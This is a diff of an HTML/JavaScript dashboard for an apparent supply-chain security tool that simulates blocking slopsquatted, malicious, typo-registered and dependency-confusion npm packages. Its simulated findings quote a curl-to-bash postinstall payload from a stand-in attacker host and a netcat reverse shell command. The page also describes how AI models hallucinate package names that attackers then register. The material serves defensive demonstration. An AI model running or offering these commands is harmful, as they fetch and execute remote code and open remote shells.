@@ -19,7 +19,9 @@ nav{display:flex;align-items:center;justify-content:space-between;padding-bottom
 .chip{display:flex;align-items:center;gap:6px;padding:6px 12px;border-radius:20px;font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:500;}
 .chip.g{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:var(--gold);}
 .chip.new{background:linear-gradient(135deg,rgba(251,191,36,.2),rgba(245,158,11,.15));border:1px solid rgba(251,191,36,.4);color:#fff8e0;font-weight:700;}
-.dot{width:6px;height:6px;border-radius:50%;background:var(--gold);animation:dp 1.5s ease-in-out infinite;}
+.chip.api-live{background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2);color:var(--green);}
+.chip.api-off{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:var(--red);}
+.dot{width:6px;height:6px;border-radius:50%;background:currentColor;animation:dp 1.5s ease-in-out infinite;}
 @keyframes dp{0%,100%{opacity:1;}50%{opacity:.2;}}
 .stats{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin-bottom:18px;}
 .stat{background:var(--s1);border:1px solid var(--b1);border-radius:10px;padding:12px 14px;position:relative;overflow:hidden;}
@@ -44,14 +46,12 @@ nav{display:flex;align-items:center;justify-content:space-between;padding-bottom
 .atk-badge.c{background:rgba(239,68,68,.12);color:var(--red);border:1px solid rgba(239,68,68,.2);}
 .atk-badge.h{background:rgba(245,158,11,.1);color:var(--amber);border:1px solid rgba(245,158,11,.15);}
 .atk-badge.n{background:rgba(251,191,36,.1);color:var(--gold);border:1px solid rgba(251,191,36,.15);}
-/* SCORE METER */
 .score-wrap{display:flex;flex-direction:column;gap:8px;}
 .score-row{display:flex;align-items:center;gap:10px;}
 .score-lbl{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--t2);width:140px;flex-shrink:0;}
 .score-bar{flex:1;height:12px;background:var(--b1);border-radius:6px;overflow:hidden;}
 .score-fill{height:100%;border-radius:6px;transition:width .8s;}
 .score-val{font-family:'JetBrains Mono',monospace;font-size:9px;width:30px;text-align:right;flex-shrink:0;}
-/* FEED */
 .feed{max-height:240px;overflow-y:auto;}
 .fr{display:grid;grid-template-columns:50px 1fr 90px 60px 70px;gap:6px;align-items:center;padding:7px 12px;border-bottom:1px solid rgba(255,255,255,.03);font-family:'JetBrains Mono',monospace;font-size:10px;}
 .fr.hdr{color:var(--t3);font-size:9px;text-transform:uppercase;border-bottom:1px solid var(--b2);}
@@ -96,22 +96,22 @@ nav{display:flex;align-items:center;justify-content:space-between;padding-bottom
       <div class="brand-sub">// Slopsquatting Defense · Reverse Shell Detection · Supply Chain Security · Sandbox Execution</div>
     </div>
   </div>
-  <div style="display:flex;gap:8px;">
+  <div style="display:flex;gap:8px;align-items:center;">
     <div class="chip new">★ NEW — 2026 Architecture</div>
     <div class="chip g"><div class="dot"></div>Package Monitor ACTIVE</div>
+    <div class="chip api-off" id="apiBadge"><div class="dot"></div><span id="apiStatus">Connecting...</span></div>
   </div>
 </nav>
 
 <div class="stats">
   <div class="stat"><div class="stat-bar" style="background:linear-gradient(90deg,var(--red),transparent)"></div><div class="stat-lbl">Blocked</div><div class="stat-val" style="color:var(--red)" id="s1">0</div><div class="stat-sub">packages blocked</div></div>
   <div class="stat"><div class="stat-bar" style="background:linear-gradient(90deg,var(--gold),transparent)"></div><div class="stat-lbl">Slopsquatting</div><div class="stat-val" style="color:var(--gold)" id="s2">0</div><div class="stat-sub">hallucination attacks</div></div>
-  <div class="stat"><div class="stat-bar" style="background:linear-gradient(90deg,var(--amber),transparent)"></div><div class="stat-lbl">Rev Shells</div><div class="stat-val" style="color:var(--amber)" id="s3">0</div><div class="stat-sub">reverse shells</div></div>
+  <div class="stat"><div class="stat-bar" style="background:linear-gradient(90deg,var(--amber),transparent)"></div><div class="stat-lbl">Rev Shells</div><div class="stat-val" style="color:var(--amber)" id="s3">0</div><div class="stat-sub">reverse shells caught</div></div>
   <div class="stat"><div class="stat-bar" style="background:linear-gradient(90deg,var(--green),transparent)"></div><div class="stat-lbl">Verified</div><div class="stat-val" style="color:var(--green)" id="s4">0</div><div class="stat-sub">safe installs</div></div>
   <div class="stat"><div class="stat-bar" style="background:linear-gradient(90deg,var(--v2),transparent)"></div><div class="stat-lbl">Sandboxed</div><div class="stat-val" style="color:var(--v2)" id="s5">0</div><div class="stat-sub">quarantined</div></div>
   <div class="stat"><div class="stat-bar" style="background:linear-gradient(90deg,var(--cyan),transparent)"></div><div class="stat-lbl">Scanned</div><div class="stat-val" style="color:var(--cyan)" id="s6">0</div><div class="stat-sub">total packages</div></div>
 </div>
 
-<!-- ATTACK TYPES -->
 <div class="attack-grid">
   <div class="atk c"><div class="atk-icon">👻</div><div class="atk-name c">Slopsquatting</div><div class="atk-desc">AI hallucinates non-existent package names. Attacker registers them on npm/PyPI with malicious payloads. 20% of AI-suggested packages are hallucinated. 43% repeat consistently across queries.</div><div class="atk-badge c">🔴 20% of AI suggestions</div></div>
   <div class="atk h"><div class="atk-icon">🐚</div><div class="atk-name h">Reverse Shell in Package</div><div class="atk-desc">Malicious package with two reverse shells: one triggers on install (postinstall hook), one at runtime. Static scanners see "0 dependencies" — payload downloaded fresh on each npm install.</div><div class="atk-badge h">🟡 86,000 downloads before detection</div></div>
@@ -121,7 +121,7 @@ nav{display:flex;align-items:center;justify-content:space-between;padding-bottom
 <div class="grid2">
   <div class="card">
     <div class="card-hd"><div class="card-title">🔍 Package Reputation Scoring</div><span class="mono" style="font-size:9px;color:var(--t3)">score &lt;50 = BLOCK</span></div>
-    <div class="card-body" id="scoreWrap">
+    <div class="card-body">
       <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--t2);margin-bottom:10px;">Signal weights for package risk assessment:</div>
       <div class="score-wrap">
         <div class="score-row"><div class="score-lbl">Exists in registry</div><div class="score-bar"><div class="score-fill" style="width:50%;background:var(--green)"></div></div><div class="score-val" style="color:var(--green)">+50</div></div>
@@ -129,7 +129,7 @@ nav{display:flex;align-items:center;justify-content:space-between;padding-bottom
         <div class="score-row"><div class="score-lbl">Downloads &gt;10K/wk</div><div class="score-bar"><div class="score-fill" style="width:15%;background:var(--green)"></div></div><div class="score-val" style="color:var(--green)">+15</div></div>
         <div class="score-row"><div class="score-lbl">Verified maintainer</div><div class="score-bar"><div class="score-fill" style="width:10%;background:var(--green)"></div></div><div class="score-val" style="color:var(--green)">+10</div></div>
         <div class="score-row"><div class="score-lbl">Hallucination pattern</div><div class="score-bar"><div class="score-fill" style="width:40%;background:var(--red)"></div></div><div class="score-val" style="color:var(--red)">-40</div></div>
-        <div class="score-row"><div class="score-lbl">Install script +network</div><div class="score-bar"><div class="score-fill" style="width:50%;background:var(--red)"></div></div><div class="score-val" style="color:var(--red)">-50</div></div>
+        <div class="score-row"><div class="score-lbl">Install script + network</div><div class="score-bar"><div class="score-fill" style="width:50%;background:var(--red)"></div></div><div class="score-val" style="color:var(--red)">-50</div></div>
         <div class="score-row"><div class="score-lbl">Package &lt;7 days old</div><div class="score-bar"><div class="score-fill" style="width:30%;background:var(--red)"></div></div><div class="score-val" style="color:var(--red)">-30</div></div>
       </div>
     </div>
@@ -184,28 +184,72 @@ nav{display:flex;align-items:center;justify-content:space-between;padding-bottom
   </div>
 </div>
 </div>
+
 <script>
-let st={b:0,s:0,r:0,v:0,q:0,sc:0},total=0;
+const API_BASE = 'https://shieldai-production.up.railway.app';
+
+async function checkApiHealth() {
+  try {
+    const res = await fetch(`${API_BASE}/health`, { signal: AbortSignal.timeout(5000) });
+    if (res.ok) {
+      const badge = document.getElementById('apiBadge');
+      badge.className = 'chip api-live';
+      badge.innerHTML = '<div class="dot"></div><span>API LIVE — Railway</span>';
+    } else throw new Error();
+  } catch {
+    document.getElementById('apiStatus').textContent = 'API offline — local mode';
+  }
+}
+checkApiHealth();
+
+let st={b:0,s:0,r:0,v:0,q:0,sc:0};
+
 const SCEN={
   slop:{pkg:'react-codeshift@1.2.0',score:0,risk:98,cls:'bl',badge:'block',btxt:'⛔ BLOCK',
-    checks:[{s:'fail',l:'Registry Check',d:'"react-codeshift" does not exist in npm registry — slopsquatting detected'},{s:'fail',l:'Hallucination Pattern',d:'Name is conflation of "jscodeshift" + "react-codemod" — classic AI hallucination pattern'},{s:'fail',l:'Age Check',d:'Package registered 3 days ago — immediately after hallucination found in GitHub commit'},{s:'fail',l:'Download Count',d:'0 downloads — no legitimate usage history'}],
+    checks:[
+      {s:'fail',l:'Registry Check',d:'"react-codeshift" does not exist in npm registry — slopsquatting detected'},
+      {s:'fail',l:'Hallucination Pattern',d:'Name is conflation of "jscodeshift" + "react-codemod" — classic AI hallucination pattern'},
+      {s:'fail',l:'Age Check',d:'Package registered 3 days ago — immediately after hallucination found in GitHub commit'},
+      {s:'fail',l:'Download Count',d:'0 downloads — no legitimate usage history'}
+    ],
     verdict:'BLOCKED — Slopsquatting Attack (AI hallucination exploitation)',type:'slop'},
   shell:{pkg:'postmark-email-mcp@2.1.0',score:5,risk:95,cls:'bl',badge:'block',btxt:'⛔ BLOCK',
-    checks:[{s:'pass',l:'Registry Check',d:'Package exists in npm registry'},{s:'fail',l:'Install Script',d:'postinstall hook detected: curl -s attacker.xyz/payload.sh | bash'},{s:'fail',l:'Sandbox Execution',d:'Package opened reverse shell in sandbox: nc -e /bin/bash 1.2.3.4 4444'},{s:'fail',l:'Network on Install',d:'Fetches external payload at install time — bypasses static scanner (shows 0 deps)'}],
+    checks:[
+      {s:'pass',l:'Registry Check',d:'Package exists in npm registry'},
+      {s:'fail',l:'Install Script',d:'postinstall hook detected: curl -s attacker.xyz/payload.sh | bash'},
+      {s:'fail',l:'Sandbox Execution',d:'Package opened reverse shell in sandbox: nc -e /bin/bash 1.2.3.4 4444'},
+      {s:'fail',l:'Network on Install',d:'Fetches external payload at install time — bypasses static scanner (shows 0 deps)'}
+    ],
     verdict:'BLOCKED — Dual Reverse Shell (L8 Sandbox caught it)',type:'shell'},
   fresh:{pkg:'new-crypto-helper@0.1.0',score:15,risk:78,cls:'bl',badge:'block',btxt:'⛔ BLOCK',
-    checks:[{s:'pass',l:'Registry Check',d:'Package exists in npm registry'},{s:'fail',l:'Age Check',d:'Package is 2 days old — high risk window for newly registered malicious packages'},{s:'warn',l:'Download Count',d:'Only 5 downloads — no community validation'},{s:'warn',l:'Maintainer',d:'New GitHub account created 3 days ago — no contribution history'}],
+    checks:[
+      {s:'pass',l:'Registry Check',d:'Package exists in npm registry'},
+      {s:'fail',l:'Age Check',d:'Package is 2 days old — high risk window for newly registered malicious packages'},
+      {s:'warn',l:'Download Count',d:'Only 5 downloads — no community validation'},
+      {s:'warn',l:'Maintainer',d:'New GitHub account created 3 days ago — no contribution history'}
+    ],
     verdict:'BLOCKED — Score 15/100 below threshold (50)',type:'fresh'},
   dep_conf:{pkg:'@internal/auth-utils@1.0.0',score:10,risk:85,cls:'bl',badge:'block',btxt:'⛔ BLOCK',
-    checks:[{s:'fail',l:'Namespace Check',d:'"@internal" namespace should be private — dependency confusion attack pattern'},{s:'fail',l:'Version Conflict',d:'Public version 1.0.0 conflicts with known internal version 3.2.1'},{s:'warn',l:'Publisher',d:'Published from unknown account, not from company npm organization'},{s:'fail',l:'Scope Analysis',d:'Package claims to be internal auth utility but is public — classic dependency confusion'}],
+    checks:[
+      {s:'fail',l:'Namespace Check',d:'"@internal" namespace should be private — dependency confusion attack pattern'},
+      {s:'fail',l:'Version Conflict',d:'Public version 1.0.0 conflicts with known internal version 3.2.1'},
+      {s:'warn',l:'Publisher',d:'Published from unknown account, not from company npm organization'},
+      {s:'fail',l:'Scope Analysis',d:'Package claims to be internal auth utility but is public — classic dependency confusion'}
+    ],
     verdict:'BLOCKED — Dependency Confusion Attack Pattern',type:'dep'},
   safe:{pkg:'ethers@6.9.0',score:95,risk:3,cls:'ok',badge:'allow',btxt:'✓ ALLOW',
-    checks:[{s:'pass',l:'Registry Check',d:'Package exists — ethers.js is the most used Ethereum library'},{s:'pass',l:'Age Check',d:'Package is 3+ years old — long track record'},{s:'pass',l:'Download Count',d:'2.1M downloads/week — massive community validation'},{s:'pass',l:'Sandbox Execution',d:'No install scripts, no network calls on install — clean'}],
+    checks:[
+      {s:'pass',l:'Registry Check',d:'Package exists — ethers.js is the most used Ethereum library'},
+      {s:'pass',l:'Age Check',d:'Package is 3+ years old — long track record'},
+      {s:'pass',l:'Download Count',d:'2.1M downloads/week — massive community validation'},
+      {s:'pass',l:'Sandbox Execution',d:'No install scripts, no network calls on install — clean'}
+    ],
     verdict:'ALLOWED — Score 95/100, trusted package',type:'safe'},
 };
+
 function sim(k){
   const s=SCEN[k];if(!s)return;
-  st.sc++;total++;
+  st.sc++;
   if(s.cls==='bl'){st.b++;if(s.type==='slop')st.s++;else if(s.type==='shell')st.r++;else st.q++;}
   else st.v++;
   addRow(s);showInspect(s);
@@ -216,23 +260,25 @@ function sim(k){
   document.getElementById('s5').textContent=st.q;
   document.getElementById('s6').textContent=st.sc;
 }
+
 function addRow(s){
   const feed=document.getElementById('feed');
   const emp=feed.querySelector('.es');if(emp)feed.innerHTML='';
-  const sc=s.score;const sc_color=sc>60?'var(--green)':sc>30?'var(--amber)':'var(--red)';
+  const sc_color=s.score>60?'var(--green)':s.score>30?'var(--amber)':'var(--red)';
   const rc=s.risk>66?'var(--red)':s.risk>33?'var(--amber)':'var(--green)';
   const row=document.createElement('div');
   row.className='fr '+s.cls;
   row.innerHTML=`<span class="muted">${new Date().toLocaleTimeString('en-US',{hour12:false})}</span><span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${s.pkg}</span><span style="color:${sc_color};font-weight:700">${s.score}/100</span><span style="color:${rc};font-weight:700">${s.risk}</span><span><span class="badge ${s.badge}">${s.btxt}</span></span>`;
   feed.insertBefore(row,feed.firstChild);
 }
+
 function showInspect(s){
   const icons={fail:'🚨',pass:'✅',warn:'⚠️'};
   const checksHtml=s.checks.map(c=>`<div class="check-item"><div class="ci-lbl ${c.s}">${icons[c.s]} ${c.l}</div><div class="ci-desc">${c.d}</div></div>`).join('');
-  const vc=s.risk>66?'danger':s.risk>33?'caution':'safe';
-  const vc_color=vc==='danger'?'var(--red)':vc==='caution'?'var(--amber)':'var(--green)';
+  const rgb=s.risk>66?'239,68,68':s.risk>33?'245,158,11':'16,185,129';
+  const vc_color=s.risk>66?'var(--red)':s.risk>33?'var(--amber)':'var(--green)';
   document.getElementById('inspResult').innerHTML=`
-    <div style="background:rgba(${s.risk>66?'239,68,68':s.risk>33?'245,158,11':'16,185,129'},.08);border:1px solid rgba(${s.risk>66?'239,68,68':s.risk>33?'245,158,11':'16,185,129'},.3);border-radius:8px;padding:10px 12px;margin-bottom:10px;">
+    <div style="background:rgba(${rgb},.08);border:1px solid rgba(${rgb},.3);border-radius:8px;padding:10px 12px;margin-bottom:10px;">
       <div style="font-size:12px;font-weight:700;color:${vc_color}">${s.verdict}</div>
       <div style="font-size:9px;color:var(--t2);font-family:'JetBrains Mono',monospace;margin-top:3px;">Package: ${s.pkg} · Score: ${s.score}/100 · Risk: ${s.risk}/100</div>
     </div>
